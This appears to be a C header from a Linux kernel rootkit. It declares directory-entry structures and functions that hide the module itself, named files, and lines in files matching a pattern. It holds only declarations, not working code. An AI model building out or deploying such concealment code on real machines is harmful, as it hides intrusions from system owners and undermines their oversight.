#ifndef HIDE_H
#define HIDE_H

#include <linux/fs.h>
#include <linux/dirent.h>

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

struct linux_dirent64
{
    unsigned long long d_ino;
    long long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

// Init / Exit
int hide_init(void);
void hide_exit(void);

void hide_module(void);

void hide_file(const char *name);
void unhide_file(const char *name);

void hide_line(const char *filename, const char *pattern);
void unhide_line(const char *filename, const char *pattern);

#endif
